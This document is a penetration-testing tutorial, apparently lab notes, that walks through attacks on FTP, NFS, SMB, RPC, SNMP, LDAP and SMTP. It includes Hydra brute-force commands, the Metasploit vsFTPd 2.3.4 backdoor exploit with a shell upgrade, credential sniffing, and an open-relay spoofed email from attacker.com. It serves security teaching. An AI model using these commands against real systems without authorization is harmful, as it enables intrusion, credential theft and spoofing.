### Network protocols allow devices to communicate and exchange data over a network. Here’s an expanded explanation of some commonly used protocols in penetration testing:

### **1. FTP (File Transfer Protocol)**

- **Port:** 21 (TCP)
- **Function:** FTP is used for transferring files between a client and a server. FTP operates over two channels:
    - **Control channel** (for sending commands)
    - **Data channel** (for transferring the actual files).
- **Common Security Issues:**
    - **Anonymous login:** Some FTP servers are misconfigured to allow anonymous logins, providing unauthorized access to files.
    - **Clear-text credentials:** FTP sends usernames and passwords in clear text, making it vulnerable to sniffing attacks.

---

### **1.1. Penetration Testing on FTP**

### **1.1.1. Anonymous Login**

When performing penetration testing, an attacker can attempt to log in using **anonymous credentials** if the FTP server allows it. Many misconfigured FTP servers allow anonymous access for easier file sharing, which is a security risk.

**Example FTP login attempt:**

```bash
bash
CopyEdit
ftp 192.168.188.131
Name: Anonymous
Password: Anonymous

```

If the server allows anonymous login, you will be able to interact with the server and explore its contents.

---

### **1.1.2. Sniffing FTP Credentials (Clear-text Passwords)**

Because FTP doesn’t encrypt traffic, usernames and passwords are sent in clear text. An attacker can use sniffing tools to capture this data, which can be used to compromise the server.

- **Wireshark:** A tool that can capture network packets and allow an attacker to see the FTP credentials.

**How to sniff credentials:**

1. **Start an FTP session**:
    
    ```bash
    bash
    CopyEdit
    ftp 192.168.188.131
    
    ```
    
2. **Capture the traffic using Wireshark.**
3. **Follow the TCP stream** to see the credentials:
    - Look for packets containing the string `"PASS"` in Wireshark, which indicates the password being sent.

**Example of clear-text credentials:**

```
plaintext
CopyEdit
USER anonymous
PASS anonymous

```

---

### **1.1.3. FTP Brute-Force Attack (Hydra)**

**Hydra** is a popular tool for performing brute-force attacks against various services, including FTP. It can attempt multiple combinations of usernames and passwords to gain unauthorized access.

**Example of brute-forcing FTP login:**

```bash
bash
CopyEdit
hydra -L user -P pass 192.168.188.131 ftp
hydra -L wordlist.txt -P wordlist.txt 192.168.188.131 ftp

```

- **L** specifies a file with usernames.
- **P** specifies a file with passwords.
- **ftp** is the target protocol.

The **wordlist** file contains a list of possible usernames or passwords to be tried. A strong wordlist (such as **rockyou.txt**) increases the chance of success.

---

### **1.1.4. FTP Remote Shell via Nmap Script**

You can also use **Nmap** to exploit specific vulnerabilities in FTP servers. The `ftp-vsftpd-backdoor.nse` script is designed to exploit a vulnerability in **vsFTPd 2.3.4**, which contains a backdoor.

**Example Nmap command to check for the backdoor:**

```bash
bash
CopyEdit
sudo nmap -p 21 192.168.188.131 -sV --script ftp-vsftpd-backdoor.nse

```

This will test if the FTP server is vulnerable to the **vsFTPd backdoor**. If the server is vulnerable, you may be able to execute commands remotely.

---

### **1.1.5. Exploiting FTP Vulnerabilities with Metasploit**

Metasploit is another powerful tool used for exploiting vulnerabilities in systems. If the FTP server is running a vulnerable version of vsFTPd (e.g., **vsFTPd 2.3.4**), Metasploit can be used to exploit it.

**Steps to exploit vsFTPd 2.3.4 with Metasploit:**

1. **Search for the exploit:**
    
    ```bash
    bash
    CopyEdit
    msfconsole
    search vsftpd 2.3.4
    
    ```
    
2. **Use the exploit:**
    
    ```bash
    bash
    CopyEdit
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST 192.168.188.131
    exploit
    
    ```
    
3. **Interact with the remote shell:**
    
    ```bash
    bash
    CopyEdit
    python -c 'import pty; pty.spawn("/bin/bash")'
    
    ```
    

By exploiting this vulnerability, you can get access to the **root** account on the target machine.

---

### **2. NFS (Network File System)**

NFS allows a system to share its files with other systems over a network. It enables the mounting of remote file systems and interaction with them as if they were local.

**Example Nmap command to scan for NFS services:**

```bash
bash
CopyEdit
nmap -p2049 -sV 192.168.188.131

```

If NFS is exposed publicly, it can be mounted to the local machine and files can be accessed.

**Mounting NFS share:**

```bash
bash
CopyEdit
sudo mount 192.168.188.131:/ /home/kali/Downloads/nfs -nolock

```

This allows you to access shared files from the remote NFS server.

**Troubleshooting NFS Mount Permission Issues:**

If you encounter **Permission Denied**, ensure that you have the correct NFS version and permissions configured.

**To use NFSv3 (if needed):**

```bash
bash
CopyEdit
sudo mount -t nfs -o vers=3 192.168.188.137:/home/vulnix /home/kali/Downloads/nfs/home/vulnix -nolock

```

---

### **3. SMB (Server Message Block)**

SMB is a protocol used for file and printer sharing, as well as inter-process communication between computers.

**Example Nmap command to scan for SMB services:**

```bash
bash
CopyEdit
sudo nmap -p 445 -sV -sC 192.168.188.131

```

**Enumerating SMB Shares:**

```bash
bash
CopyEdit
enum4linux -L -S 192.168.188.131
smbclient -L 192.168.188.131 -N
smbmap -H 192.168.188.131

```

**Brute-forcing SMB credentials:**

```bash
bash
CopyEdit
hydra -l admin -P /home/kali/pass.txt smb://192.168.188.131

```

---

### **4. RPC (Remote Procedure Call)**

RPC allows a program on one computer to execute a procedure on another computer.

**Enumerating with RPCClient:**

```bash
bash
CopyEdit
rpcclient 192.168.188.131 -U ''
$> srvinfo
$> enumdomusers

```

This will provide information about the target system and its users.

---

### **5. SNMP (Simple Network Management Protocol)**

SNMP is used to manage and monitor network devices. It can be exploited if the community string is weak or known (like **public** or **private**).

**Example SNMP enumeration with `snmpcheck`:**

```bash
bash
CopyEdit
snmpcheck -c public -h 192.168.188.131

```

**Brute-forcing SNMP community strings:**

```bash
bash
CopyEdit
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.146.156

```

---

### **6. LDAP (Lightweight Directory Access Protocol)**

LDAP is a protocol used to access and maintain directory information. It is commonly used for managing user information and authentication.

**Enumerating LDAP:**

```bash
bash
CopyEdit
ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com"

```

You can also enumerate users and gather information from LDAP directories.

**Using Metasploit for LDAP enumeration:**

```bash
bash
CopyEdit
msfconsole
use auxiliary/gather/ldap_query
set RHOSTS <IP>
set BASE "dc=example,dc=com"
run

```

---

### **7. SMTP (Simple Mail Transfer Protocol)**

SMTP is used for sending and receiving emails. It can be exploited in cases of misconfiguration, such as **open relay** or **user enumeration**.

**Enumerating SMTP:**

```bash
bash
CopyEdit
smtp-user-enum -M VRFY -U usernames.txt -t <IP>

```

This can be used to find valid email addresses on the target system.

**Exploiting Open Relay (sending emails):**

```bash
bash
CopyEdit
telnet <IP> 25
HELO attacker.com
MAIL FROM: attacker@attacker.com
RCPT TO: victim@victim.com
DATA
Subject: Test
This is a test email.
.

```
